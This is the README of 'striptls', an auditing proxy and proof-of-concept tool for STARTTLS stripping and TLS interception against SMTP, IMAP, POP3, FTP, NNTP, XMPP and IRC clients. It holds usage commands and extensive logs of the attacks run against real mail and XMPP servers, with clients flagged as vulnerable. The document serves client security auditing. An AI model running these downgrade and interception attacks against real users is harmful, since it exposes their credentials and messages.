striptls - auditing proxy
=========================

poc implementation of STARTTLS stripping attacks

-  SMTP
-  SMTP.StripFromCapabilities - server response capability patch
-  SMTP.StripWithInvalidResponseCode - client STARTTLS stripping,
   invalid response code
-  SMTP.UntrustedIntercept - STARTTLS interception (client and server
   talking ssl) (requires server.pem in pwd)
-  SMTP.StripWithTemporaryError
-  SMTP.StripWithError
-  SMTP.ProtocolDowngradeStripExtendedMode
-  SMTP.InjectCommand
-  POP3
-  POP3.StripFromCapabilities
-  POP3.StripWithError
-  POP3.UntrustedIntercept
-  IMAP
-  IMAP.StripFromCapabilities
-  IMAP.StripWithError
-  IMAP.UntrustedIntercept
-  IMAP.ProtocolDowngradeToV2
-  FTP
-  FTP.StripFromCapabilities
-  FTP.StripWithError
-  FTP.UntrustedIntercept
-  NNTP
-  NNTP.StripFromCapabilities
-  NNTP.StripWithError
-  NNTP.UntrustedIntercept
-  XMPP
-  XMPP.StripFromCapabilities
-  XMPP.StripInboundTLS
-  XMPP.UntrustedIntercept
-  ACAP (untested)
-  ACAP.StripFromCapabilities
-  ACAP.StripWithError
-  ACAP.UntrustedIntercept
-  IRC
-  IRC.StripFromCapabilities
-  IRC.StripWithError
-  IRC.UntrustedIntercept
-  IRC.StripWithNotRegistered
-  IRC.StripCAPWithNotregistered
-  IRC.StripWithSilentDrop

Results:

::

    - [*] client: 127.0.0.1
    -     [Vulnerable!] <class striptls.StripWithInvalidResponseCode at 0xffd3138c>
    -     [Vulnerable!] <class striptls.StripWithTemporaryError at 0xffd4611c>
    -     [           ] <class striptls.StripFromCapabilities at 0xffd316bc>
    -     [Vulnerable!] <class striptls.StripWithError at 0xffd4614c>
    - [*] client: 192.168.139.1
    -     [Vulnerable!] <class striptls.StripInboundTLS at 0x7f08319a6808>
    -     [Vulnerable!] <class striptls.StripFromCapabilities at 0x7f08319a67a0>
    -     [Vulnerable!] <class striptls.UntrustedIntercept at 0x7f08319a6870>

Usage
-----

::

    #> python -m striptls --help    # from pip/setup.py
    #> python striptls --help       # from source / root folder
        Usage: striptls.py [options]

               example: striptls.py --listen 0.0.0.0:25 --remote mail.server.tld:25


        Options:
          -h, --help            show this help message and exit
          -v, --verbose         make lots of noise [default]
          -l LISTEN, --listen=LISTEN
                                listen ip:port [default: 0.0.0.0:<remote_port>]
          -r REMOTE, --remote=REMOTE
                                remote target ip:port to forward sessions to
          -k KEY, --key=KEY     SSL Certificate and Private key file to use, PEM
                                format assumed [default: server.pem]
          -x VECTORS, --vectors=VECTORS
                                Comma separated list of vectors. Use 'ALL' (default)
                                to select all vectors. Available vectors:
                                ACAP.StripFromCapabilities, ACAP.StripWithError,
                                ACAP.UntrustedIntercept, FTP.StripFromCapabilities,
                                FTP.StripWithError, FTP.UntrustedIntercept,
                                IMAP.ProtocolDowngradeToV2,
                                IMAP.StripFromCapabilities, IMAP.StripWithError,
                                IMAP.UntrustedIntercept,
                                IRC.StripCAPWithNotRegistered,
                                IRC.StripFromCapabilities, IRC.StripWithError,
                                IRC.StripWithNotRegistered, IRC.StripWithSilentDrop,
                                IRC.UntrustedIntercept, NNTP.StripFromCapabilities,
                                NNTP.StripWithError, NNTP.UntrustedIntercept,
                                POP3.StripFromCapabilities, POP3.StripWithError,
                                POP3.UntrustedIntercept, SMTP.InboundStarttlsProxy,
                                SMTP.InjectCommand,
                                SMTP.ProtocolDowngradeStripExtendedMode,
                                SMTP.StripFromCapabilities, SMTP.StripWithError,
                                SMTP.StripWithInvalidResponseCode,
                                SMTP.StripWithTemporaryError, SMTP.UntrustedIntercept,
                                XMPP.StripFromCapabilities, XMPP.StripInboundTLS,
                                XMPP.UntrustedIntercept [default: ALL]

Install (optional)
------------------

from pip

::

    #> pip install striptls

from source

::

    #> setup.py install

Examples
--------

::

                      inbound                    outbound
    [inbound_peer]<------------->[listen:proxy]<------------->[outbound_peer/target]
      smtp-client                   striptls                    remote/target
      

local ``smtp-client`` -> ``localhost:8825`` (proxy) ->
``mail.gmx.net:25``

Audit Mode
~~~~~~~~~~

iterates all protocol specific cases on a per client basis and keeps
track of clients violating the starttls protocol. Ctrl+C to abort audit
and print results.

::

    #> python striptls --listen localhost:8825 --remote=mail.gmx.net:25
    2016-02-02 22:11:56,275 - INFO     - <Proxy 0xffcf6d0cL listen=('localhost', 8825) target=('mail.gmx.net', 25)> ready.
    2016-02-02 22:11:56,275 - DEBUG    - * added test (port:21   , proto:     FTP): <class striptls.StripFromCapabilities at 0xffd4632c>
    2016-02-02 22:11:56,275 - DEBUG    - * added test (port:21   , proto:     FTP): <class striptls.StripWithError at 0xffd4635c>
    2016-02-02 22:11:56,275 - DEBUG    - * added test (port:21   , proto:     FTP): <class striptls.UntrustedIntercept at 0xffd4638c>
    2016-02-02 22:11:56,275 - DEBUG    - * added test (port:143  , proto:    IMAP): <class striptls.StripFromCapabilities at 0xffd4626c>
    2016-02-02 22:11:56,275 - DEBUG    - * added test (port:143  , proto:    IMAP): <class striptls.StripWithError at 0xffd4629c>
    2016-02-02 22:11:56,275 - DEBUG    - * added test (port:143  , proto:    IMAP): <class striptls.UntrustedIntercept at 0xffd462cc>
    2016-02-02 22:11:56,275 - DEBUG    - * added test (port:119  , proto:    NNTP): <class striptls.StripFromCapabilities at 0xffd463ec>
    2016-02-02 22:11:56,275 - DEBUG    - * added test (port:119  , proto:    NNTP): <class striptls.StripWithError at 0xffd4641c>
    2016-02-02 22:11:56,275 - DEBUG    - * added test (port:119  , proto:    NNTP): <class striptls.UntrustedIntercept at 0xffd4644c>
    2016-02-02 22:11:56,275 - DEBUG    - * added test (port:110  , proto:    POP3): <class striptls.StripWithError at 0xffd461dc>
    2016-02-02 22:11:56,275 - DEBUG    - * added test (port:110  , proto:    POP3): <class striptls.UntrustedIntercept at 0xffd4620c>
    2016-02-02 22:11:56,275 - DEBUG    - * added test (port:25   , proto:    SMTP): <class striptls.StripFromCapabilities at 0xffd316bc>
    2016-02-02 22:11:56,275 - DEBUG    - * added test (port:25   , proto:    SMTP): <class striptls.StripWithError at 0xffd4614c>
    2016-02-02 22:11:56,276 - DEBUG    - * added test (port:25   , proto:    SMTP): <class striptls.StripWithInvalidResponseCode at 0xffd3138c>
    2016-02-02 22:11:56,276 - DEBUG    - * added test (port:25   , proto:    SMTP): <class striptls.StripWithTemporaryError at 0xffd4611c>
    2016-02-02 22:11:56,276 - DEBUG    - * added test (port:25   , proto:    SMTP): <class striptls.UntrustedIntercept at 0xffd4617c>
    2016-02-02 22:11:56,276 - DEBUG    - * added test (port:5222 , proto:    XMPP): <class striptls.StripFromCapabilities at 0xffd464ac>
    2016-02-02 22:11:56,276 - INFO     - <RewriteDispatcher vectors={5222: set([<class striptls.StripFromCapabilities at 0xffd464ac>]), 110: set([<class striptls.UntrustedIntercept at 0xffd4620c>, <class striptls.StripWithError at 0xffd461dc>]), 143: set([<class striptls.StripWithError at 0xffd4629c>, <class striptls.UntrustedIntercept at 0xffd462cc>, <class striptls.StripFromCapabilities at 0xffd4626c>]), 21: set([<class striptls.UntrustedIntercept at 0xffd4638c>, <class striptls.StripFromCapabilities at 0xffd4632c>, <class striptls.StripWithError at 0xffd4635c>]), 119: set([<class striptls.StripWithError at 0xffd4641c>, <class striptls.UntrustedIntercept at 0xffd4644c>, <class striptls.StripFromCapabilities at 0xffd463ec>]), 25: set([<class striptls.StripWithInvalidResponseCode at 0xffd3138c>, <class striptls.StripWithTemporaryError at 0xffd4611c>, <class striptls.StripFromCapabilities at 0xffd316bc>, <class striptls.StripWithError at 0xffd4614c>, <class striptls.UntrustedIntercept at 0xffd4617c>])}>
    2016-02-02 22:12:08,477 - DEBUG    - <ProtocolDetect 0xffcf6eccL protocol_id=PROTO_SMTP len_history=0> - protocol detected (target port)
    2016-02-02 22:12:08,530 - INFO     - <Session 0xffcf6e4cL> client ('127.0.0.1', 28902) has connected
    2016-02-02 22:12:08,530 - INFO     - <Session 0xffcf6e4cL> connecting to target ('mail.gmx.net', 25)
    2016-02-02 22:12:08,805 - DEBUG    - <Session 0xffcf6e4cL> [client] <= [server]          '220 gmx.com (mrgmx001) Nemesis ESMTP Service ready\r\n'
    2016-02-02 22:12:08,805 - DEBUG    - <RewriteDispatcher  - changed mangle: striptls.StripWithInvalidResponseCode new: True>
    2016-02-02 22:12:09,759 - DEBUG    - <Session 0xffcf6e4cL> [client] => [server]          'ehlo [192.168.139.1]\r\n'
    2016-02-02 22:12:09,850 - DEBUG    - <Session 0xffcf6e4cL> [client] <= [server]          '250-gmx.com Hello [192.168.139.1] [109.126.64.2]\r\n250-SIZE 31457280\r\n250-AUTH LOGIN PLAIN\r\n250 STARTTLS\r\n'
    2016-02-02 22:12:09,851 - DEBUG    - <Session 0xffcf6e4cL> [client] <= [server][mangled] '250-gmx.com Hello [192.168.139.1] [109.126.64.2]\r\n250-SIZE 31457280\r\n250-AUTH LOGIN PLAIN\r\n250-STARTTLS\r\n250 STARTTLS\r\n'
    2016-02-02 22:12:09,867 - DEBUG    - <Session 0xffcf6e4cL> [client] => [server]          'STARTTLS\r\n'
    2016-02-02 22:12:09,867 - DEBUG    - <Session 0xffcf6e4cL> [client] <= [server][mangled] '200 STRIPTLS\r\n'
    2016-02-02 22:12:09,867 - DEBUG    - <Session 0xffcf6e4cL> [client] => [server][mangled] None
    2016-02-02 22:12:09,883 - DEBUG    - <Session 0xffcf6e4cL> [client] => [server]          'mail FROM:<a@b.com> size=10\r\n'
    2016-02-02 22:12:09,983 - DEBUG    - <Session 0xffcf6e4cL> [client] <= [server]          '530 Authentication required\r\n'
    2016-02-02 22:12:09,992 - DEBUG    - <Session 0xffcf6e4cL> [client] => [server]          'rset\r\n'
    2016-02-02 22:12:10,100 - DEBUG    - <Session 0xffcf6e4cL> [client] <= [server]          '250 OK\r\n'
    2016-02-02 22:12:10,116 - WARNING  - <Session 0xffcf6e4cL> terminated.
    2016-02-02 22:12:13,056 - DEBUG    - <ProtocolDetect 0xffd0920cL protocol_id=PROTO_SMTP len_history=0> - protocol detected (target port)
    2016-02-02 22:12:13,056 - INFO     - <Session 0xffd0918cL> client ('127.0.0.1', 28905) has connected
    2016-02-02 22:12:13,057 - INFO     - <Session 0xffd0918cL> connecting to target ('mail.gmx.net', 25)
    2016-02-02 22:12:13,241 - DEBUG    - <Session 0xffd0918cL> [client] <= [server]          '220 gmx.com (mrgmx003) Nemesis ESMTP Service ready\r\n'
    2016-02-02 22:12:13,241 - DEBUG    - <RewriteDispatcher  - changed mangle: striptls.StripWithTemporaryError new: True>
    2016-02-02 22:12:14,197 - DEBUG    - <Session 0xffd0918cL> [client] => [server]          'ehlo [192.168.139.1]\r\n'
    2016-02-02 22:12:14,289 - DEBUG    - <Session 0xffd0918cL> [client] <= [server]          '250-gmx.com Hello [192.168.139.1] [109.126.64.2]\r\n250-SIZE 31457280\r\n250-AUTH LOGIN PLAIN\r\n250 STARTTLS\r\n'
    2016-02-02 22:12:14,304 - DEBUG    - <Session 0xffd0918cL> [client] => [server]          'STARTTLS\r\n'
    2016-02-02 22:12:14,305 - DEBUG    - <Session 0xffd0918cL> [client] <= [server][mangled] '454 TLS not available due to temporary reason\r\n'
    2016-02-02 22:12:14,305 - DEBUG    - <Session 0xffd0918cL> [client] => [server][mangled] None
    2016-02-02 22:12:14,320 - DEBUG    - <Session 0xffd0918cL> [client] => [server]          'mail FROM:<a@b.com> size=10\r\n'
    2016-02-02 22:12:14,411 - DEBUG    - <Session 0xffd0918cL> [client] <= [server]          '530 Authentication required\r\n'
    2016-02-02 22:12:14,415 - DEBUG    - <Session 0xffd0918cL> [client] => [server]          'rset\r\n'
    2016-02-02 22:12:14,520 - DEBUG    - <Session 0xffd0918cL> [client] <= [server]          '250 OK\r\n'
    2016-02-02 22:12:14,535 - WARNING  - <Session 0xffd0918cL> terminated.
    2016-02-02 22:12:16,649 - DEBUG    - <ProtocolDetect 0xffd092ecL protocol_id=PROTO_SMTP len_history=0> - protocol detected (target port)
    2016-02-02 22:12:16,650 - INFO     - <Session 0xffd0926cL> client ('127.0.0.1', 28908) has connected
    2016-02-02 22:12:16,650 - INFO     - <Session 0xffd0926cL> connecting to target ('mail.gmx.net', 25)
    2016-02-02 22:12:16,820 - DEBUG    - <Session 0xffd0926cL> [client] <= [server]          '220 gmx.com (mrgmx003) Nemesis ESMTP Service ready\r\n'
    2016-02-02 22:12:16,820 - DEBUG    - <RewriteDispatcher  - changed mangle: striptls.StripFromCapabilities new: True>
    2016-02-02 22:12:17,760 - DEBUG    - <Session 0xffd0926cL> [client] => [server]          'ehlo [192.168.139.1]\r\n'
    2016-02-02 22:12:17,849 - DEBUG    - <Session 0xffd0926cL> [client] <= [server]          '250-gmx.com Hello [192.168.139.1] [109.126.64.2]\r\n250-SIZE 31457280\r\n250-AUTH LOGIN PLAIN\r\n250 STARTTLS\r\n'
    2016-02-02 22:12:17,849 - DEBUG    - <Session 0xffd0926cL> [client] <= [server][mangled] '250-gmx.com Hello [192.168.139.1] [109.126.64.2]\r\n250-SIZE 31457280\r\n250 AUTH LOGIN PLAIN\r\n'
    2016-02-02 22:12:17,871 - WARNING  - <Session 0xffd0926cL> terminated.
    2016-02-02 22:12:20,071 - DEBUG    - <ProtocolDetect 0xffd093ccL protocol_id=PROTO_SMTP len_history=0> - protocol detected (target port)
    2016-02-02 22:12:20,072 - INFO     - <Session 0xffd0934cL> client ('127.0.0.1', 28911) has connected
    2016-02-02 22:12:20,072 - INFO     - <Session 0xffd0934cL> connecting to target ('mail.gmx.net', 25)
    2016-02-02 22:12:20,239 - DEBUG    - <Session 0xffd0934cL> [client] <= [server]          '220 gmx.com (mrgmx002) Nemesis ESMTP Service ready\r\n'
    2016-02-02 22:12:20,240 - DEBUG    - <RewriteDispatcher  - changed mangle: striptls.StripWithError new: True>
    2016-02-02 22:12:21,181 - DEBUG    - <Session 0xffd0934cL> [client] => [server]          'ehlo [192.168.139.1]\r\n'
    2016-02-02 22:12:21,269 - DEBUG    - <Session 0xffd0934cL> [client] <= [server]          '250-gmx.com Hello [192.168.139.1] [109.126.64.2]\r\n250-SIZE 31457280\r\n250-AUTH LOGIN PLAIN\r\n250 STARTTLS\r\n'
    2016-02-02 22:12:21,280 - DEBUG    - <Session 0xffd0934cL> [client] => [server]          'STARTTLS\r\n'
    2016-02-02 22:12:21,281 - DEBUG    - <Session 0xffd0934cL> [client] <= [server][mangled] '501 Syntax error\r\n'
    2016-02-02 22:12:21,281 - DEBUG    - <Session 0xffd0934cL> [client] => [server][mangled] None
    2016-02-02 22:12:21,289 - DEBUG    - <Session 0xffd0934cL> [client] => [server]          'mail FROM:<a@b.com> size=10\r\n'
    2016-02-02 22:12:21,381 - DEBUG    - <Session 0xffd0934cL> [client] <= [server]          '530 Authentication required\r\n'
    2016-02-02 22:12:21,386 - DEBUG    - <Session 0xffd0934cL> [client] => [server]          'rset\r\n'
    2016-02-02 22:12:21,469 - DEBUG    - <Session 0xffd0934cL> [client] <= [server]          '250 OK\r\n'
    2016-02-02 22:12:21,485 - WARNING  - <Session 0xffd0934cL> terminated.
    2016-02-02 22:12:23,665 - WARNING  - Ctrl C - Stopping server
    2016-02-02 22:12:23,665 - INFO     -  -- audit results --
    2016-02-02 22:12:23,666 - INFO     - [*] client: 127.0.0.1
    2016-02-02 22:12:23,666 - INFO     -     [Vulnerable!] <class striptls.StripWithInvalidResponseCode at 0xffd3138c>
    2016-02-02 22:12:23,666 - INFO     -     [Vulnerable!] <class striptls.StripWithTemporaryError at 0xffd4611c>
    2016-02-02 22:12:23,666 - INFO     -     [           ] <class striptls.StripFromCapabilities at 0xffd316bc>
    2016-02-02 22:12:23,666 - INFO     -     [Vulnerable!] <class striptls.StripWithError at 0xffd4614c>

Strip STARTTLS from server capabilities
~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~

::

    #> python striptls --listen=localhost:8825 --remote=mail.gmx.net:25 --test=SMTP.StripFromCapabilities
    2016-01-31 15:44:35,000 - INFO     - <Proxy 0x1fe6e70 listen=('localhost', 8825) target=('mail.gmx.net', 25)> ready.
    2016-01-31 15:44:35,000 - INFO     - <RewriteDispatcher attacks={25: set([<class __main__.StripFromCapabilities at 0x01FE77D8>])}>
    2016-01-31 15:44:37,030 - DEBUG    - <ProtocolDetect 0x1fe6f90 is_protocol=PROTO_SMTP len_history=0> - protocol detected (target port)
    2016-01-31 15:44:37,032 - INFO     - <Session 0x1fe6f10> client ('127.0.0.1', 20070) has connected
    2016-01-31 15:44:37,032 - INFO     - <Session 0x1fe6f10> connecting to target ('mail.gmx.net', 25)
    2016-01-31 15:44:39,051 - DEBUG    - <Session 0x1fe6f10> [client] <= [server]          '220 gmx.com (mrgmx003) Nemesis ESMTP Service ready\r\n'
    2016-01-31 15:44:40,335 - DEBUG    - <Session 0x1fe6f10> [client] => [server]          'ehlo [192.168.139.1]\r\n'
    2016-01-31 15:44:40,746 - DEBUG    - <Session 0x1fe6f10> [client] <= [server]          '250-gmx.com Hello [192.168.139.1] [109.126.64.18]\r\n250-SIZE 31457280\r\n250-AUTH LOGIN PLAIN\r\n250 STARTTLS\r\n'
    2016-01-31 15:44:40,746 - DEBUG    - <Session 0x1fe6f10> [client] <= [server][mangled] '250-gmx.com Hello [192.168.139.1] [109.126.64.18]\r\n250-SIZE 31457280\r\n250 AUTH LOGIN PLAIN\r\n'
    2016-01-31 15:44:40,746 - DEBUG    - <Session 0x1fe6f10> [client] => [server]          'mail FROM:<a@b.com> size=10\r\n'
    2016-01-31 15:44:41,292 - DEBUG    - <Session 0x1fe6f10> [client] <= [server]          '530 Authentication required\r\n'
    2016-01-31 15:44:41,292 - DEBUG    - <Session 0x1fe6f10> [client] => [server]          'rset\r\n'
    2016-01-31 15:44:41,605 - DEBUG    - <Session 0x1fe6f10> [client] <= [server]          '250 OK\r\n'
    2016-01-31 15:44:41,612 - WARNING  - <Session 0x1fe6f10> terminated.

Invalid STARTTLS response code
~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~

::

    #> python striptls --listen=localhost:8825 --remote=mail.gmx.net:25 --test=SMTP.StripWithInvalidResponseCode
    2016-01-31 15:42:40,325 - INFO     - <Proxy 0x1fefe70 listen=('localhost', 8825) target=('mail.gmx.net', 25)> ready.
    2016-01-31 15:42:40,325 - INFO     - <RewriteDispatcher attacks={25: set([<class __main__.StripWithInvalidResponseCode at 0x02010730>])}>
    2016-01-31 15:43:19,755 - DEBUG    - <ProtocolDetect 0x1feff90 is_protocol=PROTO_SMTP len_history=0> - protocol detected (target port)
    2016-01-31 15:43:19,756 - INFO     - <Session 0x1feff10> client ('127.0.0.1', 20061) has connected
    2016-01-31 15:43:19,756 - INFO     - <Session 0x1feff10> connecting to target ('mail.gmx.net', 25)
    2016-01-31 15:43:21,473 - DEBUG    - <Session 0x1feff10> [client] <= [server]          '220 gmx.com (mrgmx003) Nemesis ESMTP Service ready\r\n'
    2016-01-31 15:43:22,395 - DEBUG    - <Session 0x1feff10> [client] => [server]          'ehlo [192.168.139.1]\r\n'
    2016-01-31 15:43:23,019 - DEBUG    - <Session 0x1feff10> [client] <= [server]          '250-gmx.com Hello [192.168.139.1] [109.126.64.18]\r\n250-SIZE 31457280\r\n250-AUTH LOGIN PLAIN\r\n250 STARTTLS\r\n'
    2016-01-31 15:43:23,019 - DEBUG    - <Session 0x1feff10> [client] <= [server][mangled] '250-gmx.com Hello [192.168.139.1] [109.126.64.18]\r\n250-SIZE 31457280\r\n250-AUTH LOGIN PLAIN\r\n250-STARTTLS\r\n250 STARTTLS\r\n'
    2016-01-31 15:43:23,035 - DEBUG    - <Session 0x1feff10> [client] => [server]          'STARTTLS\r\n'
    2016-01-31 15:43:23,035 - DEBUG    - <Session 0x1feff10> [client] <= [server][mangled] '200 STRIPTLS\r\n'
    2016-01-31 15:43:23,035 - DEBUG    - <Session 0x1feff10> [client] => [server][mangled] None
    2016-01-31 15:43:23,035 - DEBUG    - <Session 0x1feff10> [client] => [server]          'mail FROM:<a@b.com> size=10\r\n'
    2016-01-31 15:43:23,160 - DEBUG    - <Session 0x1feff10> [client] <= [server]          '530 Authentication required\r\n'
    2016-01-31 15:43:23,160 - DEBUG    - <Session 0x1feff10> [client] => [server]          'rset\r\n'
    2016-01-31 15:43:23,269 - DEBUG    - <Session 0x1feff10> [client] <= [server]          '250 OK\r\n'
    2016-01-31 15:43:23,285 - WARNING  - <Session 0x1feff10> terminated.

Untrusted SSL Intercept (for clients not checking server cert trust)
~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~

::

    #> python striptls --listen=localhost:8825 --remote=mail.gmx.net:25 --test=SMTP.UntrustedIntercept
    2016-01-31 15:59:02,417 - INFO     - <Proxy 0x1f468f0 listen=('localhost', 8825) target=('mail.gmx.net', 25)> ready.
    2016-01-31 15:59:02,417 - INFO     - <RewriteDispatcher attacks={25: set([<class __main__.UntrustedIntercept at 0x01F45298>])}>
    2016-01-31 15:59:06,292 - DEBUG    - <ProtocolDetect 0x1f46a10 protocol_id=PROTO_SMTP len_history=0> - protocol detected (target port)
    2016-01-31 15:59:06,293 - INFO     - <Session 0x1f46990> client ('127.0.0.1', 20238) has connected
    2016-01-31 15:59:06,293 - INFO     - <Session 0x1f46990> connecting to target ('mail.gmx.net', 25)
    2016-01-31 15:59:06,561 - DEBUG    - <Session 0x1f46990> [client] <= [server]          '220 gmx.com (mrgmx002) Nemesis ESMTP Service ready\r\n'
    2016-01-31 15:59:07,500 - DEBUG    - <Session 0x1f46990> [client] => [server]          'ehlo [192.168.139.1]\r\n'
    2016-01-31 15:59:07,565 - DEBUG    - <Session 0x1f46990> [client] <= [server]          '250-gmx.com Hello [192.168.139.1] [109.126.64.18]\r\n250-SIZE 31457280\r\n250-AUTH LOGIN PLAIN\r\n250 STARTTLS\r\n'
    2016-01-31 15:59:07,581 - DEBUG    - <Session 0x1f46990> [client] => [server]          'STARTTLS\r\n'
    2016-01-31 15:59:07,581 - DEBUG    - <Session 0x1f46990> [client] <= [server][mangled] '220 Go ahead\r\n'
    2016-01-31 15:59:07,832 - DEBUG    - <Session 0x1f46990> [client] <= [server][mangled] waiting for inbound SSL Handshake
    2016-01-31 15:59:07,832 - DEBUG    - <Session 0x1f46990> [client] => [server]          'STARTTLS\r\n'
    2016-01-31 15:59:07,926 - DEBUG    - <Session 0x1f46990> [client] => [server][mangled] performing outbound SSL handshake
    2016-01-31 15:59:08,219 - DEBUG    - <Session 0x1f46990> [client] => [server][mangled] None
    2016-01-31 15:59:08,219 - DEBUG    - <Session 0x1f46990> [client] => [server]          'ehlo [192.168.139.1]\r\n'
    2016-01-31 15:59:08,312 - DEBUG    - <Session 0x1f46990> [client] <= [server]          '250-gmx.com Hello [192.168.139.1] [109.126.64.18]\r\n250-SIZE 69920427\r\n250 AUTH LOGIN PLAIN\r\n'
    2016-01-31 15:59:08,312 - DEBUG    - <Session 0x1f46990> [client] => [server]          'mail FROM:<a@b.com> size=10\r\n'
    2016-01-31 15:59:08,407 - DEBUG    - <Session 0x1f46990> [client] <= [server]          '530 Authentication required\r\n'
    2016-01-31 15:59:08,407 - DEBUG    - <Session 0x1f46990> [client] => [server]          'rset\r\n'
    2016-01-31 15:59:08,469 - DEBUG    - <Session 0x1f46990> [client] <= [server]          '250 OK\r\n'
    2016-01-31 15:59:08,484 - WARNING  - <Session 0x1f46990> terminated.

XMPP Audit Trail
~~~~~~~~~~~~~~~~

Example: Pidgin with optional transport security.

XMPP.StripInboundTLS - Inbound Plain - Outbound TLS - in case server requires starttls
^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^

::

        python striptls --listen 0.0.0.0:5222 --remote jabber.ccc.de:5222 -k ../server.pem
        2016-02-05 16:53:28,842 - INFO     - <Proxy 0x7f08322ba310 listen=('0.0.0.0', 5222) target=('jabber.ccc.de', 5222)> ready.
        ...
        2016-02-05 16:53:30,401 - DEBUG    - <ProtocolDetect 0x7f083196a810 protocol_id=PROTO_XMPP len_history=0> - protocol detected (target port)
        ...
        2016-02-05 16:53:30,401 - INFO     - <Session 0x7f083196a7d0> client ('192.168.139.1', 56888) has connected
        2016-02-05 16:53:30,402 - INFO     - <Session 0x7f083196a7d0> connecting to target ('jabber.ccc.de', 5222)
        2016-02-05 16:53:30,923 - DEBUG    - <Session 0x7f083196a7d0> [client] => [server]          "<?xml version='1.0' ?><stream:stream to='jabber.ccc.de' xmlns='jabber:client' xmlns:stream='http://etherx.jabber.org/streams' version='1.0'>"
        2016-02-05 16:53:30,925 - DEBUG    - <RewriteDispatcher  - changed mangle: striptls.StripInboundTLS new: True>
        2016-02-05 16:53:31,005 - DEBUG    - <Session 0x7f083196a7d0> [client] <= [server]          "<?xml version='1.0'?><stream:stream xmlns='jabber:client' xmlns:stream='http://etherx.jabber.org/streams' id='13821701589972978594' from='jabber.ccc.de' version='1.0' xml:lang='en'>"
        2016-02-05 16:53:31,009 - DEBUG    - <Session 0x7f083196a7d0> [client] <= [server]          "<stream:features><c xmlns='http://jabber.org/protocol/caps' hash='sha-1' node='http://www.process-one.net/en/ejabberd/' ver='bvEOjW9q8CEw8mw8ecNTLXvY5WQ='/><starttls xmlns='urn:ietf:params:xml:ns:xmpp-tls'><required/></starttls></stream:features>"
        2016-02-05 16:53:31,012 - DEBUG    - <Session 0x7f083196a7d0> [client] => [server][mangled] "<starttls xmlns='urn:ietf:params:xml:ns:xmpp-tls'/>"
        2016-02-05 16:53:31,069 - DEBUG    - <Session 0x7f083196a7d0> [client] => [server][mangled] performing outbound SSL handshake
        2016-02-05 16:53:31,199 - DEBUG    - <Session 0x7f083196a7d0> [client] <= [server][mangled] "<stream:features><c xmlns='http://jabber.org/protocol/caps' hash='sha-1' node='http://www.process-one.net/en/ejabberd/' ver='bvEOjW9q8CEw8mw8ecNTLXvY5WQ='/></stream:features>"
        2016-02-05 16:53:31,203 - DEBUG    - <Session 0x7f083196a7d0> [client] => [server]          "<iq type='get' id='purple9f914f80'><query xmlns='jabber:iq:auth'><username>tin</username></query></iq>"
        2016-02-05 16:53:31,259 - DEBUG    - <Session 0x7f083196a7d0> [client] <= [server]          "<?xml version='1.0'?><stream:stream xmlns='jabber:client' xmlns:stream='http://etherx.jabber.org/streams' id='13515446948282835507' from='jabber.ccc.de' xml:lang='en'>"
        2016-02-05 16:53:31,263 - DEBUG    - <Session 0x7f083196a7d0> [client] <= [server]          "<stream:error><invalid-namespace xmlns='urn:ietf:params:xml:ns:xmpp-streams'></invalid-namespace></stream:error>"
        2016-02-05 16:53:31,266 - DEBUG    - <Session 0x7f083196a7d0> [client] <= [server]          '</stream:stream>'
        2016-02-05 16:53:31,269 - WARNING  - <Session 0x7f083196a7d0> terminated.

XMPP.StripFromCapabilities - strip starttls server annoucement
^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^

::

        2016-02-05 16:53:34,633 - DEBUG    - <ProtocolDetect 0x7f083196a990 protocol_id=PROTO_XMPP len_history=0> - protocol detected (target port)
        2016-02-05 16:53:34,633 - INFO     - <Session 0x7f083196a910> client ('192.168.139.1', 56890) has connected
        2016-02-05 16:53:34,633 - INFO     - <Session 0x7f083196a910> connecting to target ('jabber.ccc.de', 5222)
        2016-02-05 16:53:34,741 - DEBUG    - <Session 0x7f083196a910> [client] => [server]          "<?xml version='1.0' ?><stream:stream to='jabber.ccc.de' xmlns='jabber:client' xmlns:stream='http://etherx.jabber.org/streams' version='1.0'>"
        2016-02-05 16:53:34,742 - DEBUG    - <RewriteDispatcher  - changed mangle: striptls.StripFromCapabilities new: True>
        2016-02-05 16:53:34,810 - DEBUG    - <Session 0x7f083196a910> [client] <= [server]          "<?xml version='1.0'?><stream:stream xmlns='jabber:client' xmlns:stream='http://etherx.jabber.org/streams' id='12381525525258986322' from='jabber.ccc.de' version='1.0' xml:lang='en'>"
        2016-02-05 16:53:34,814 - DEBUG    - <Session 0x7f083196a910> [client] <= [server]          "<stream:features><c xmlns='http://jabber.org/protocol/caps' hash='sha-1' node='http://www.process-one.net/en/ejabberd/' ver='bvEOjW9q8CEw8mw8ecNTLXvY5WQ='/><starttls xmlns='urn:ietf:params:xml:ns:xmpp-tls'><required/></starttls></stream:features>"
        2016-02-05 16:53:34,816 - DEBUG    - <Session 0x7f083196a910> [client] <= [server][mangled] "<stream:features><c xmlns='http://jabber.org/protocol/caps' hash='sha-1' node='http://www.process-one.net/en/ejabberd/' ver='bvEOjW9q8CEw8mw8ecNTLXvY5WQ='/></stream:features>"
        2016-02-05 16:53:34,869 - DEBUG    - <Session 0x7f083196a910> [client] => [server]          "<iq type='get' id='purplecfe2ee07'><query xmlns='jabber:iq:auth'><username>tin</username></query></iq>"
        2016-02-05 16:53:34,920 - DEBUG    - <Session 0x7f083196a910> [client] <= [server]          "<stream:error><policy-violation xmlns='urn:ietf:params:xml:ns:xmpp-streams'></policy-violation><text xml:lang='' xmlns='urn:ietf:params:xml:ns:xmpp-streams'>Use of STARTTLS required</text></stream:error></stream:stream>"
        2016-02-05 16:53:34,926 - WARNING  - <Session 0x7f083196a910> terminated.

XMPP.StripUntrustedIntercept - TLS Interception inbound and outbound with own certificate/key
^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^

::

        2016-02-05 16:53:42,799 - DEBUG    - <ProtocolDetect 0x7f083196aa90 protocol_id=PROTO_XMPP len_history=0> - protocol detected (target port)
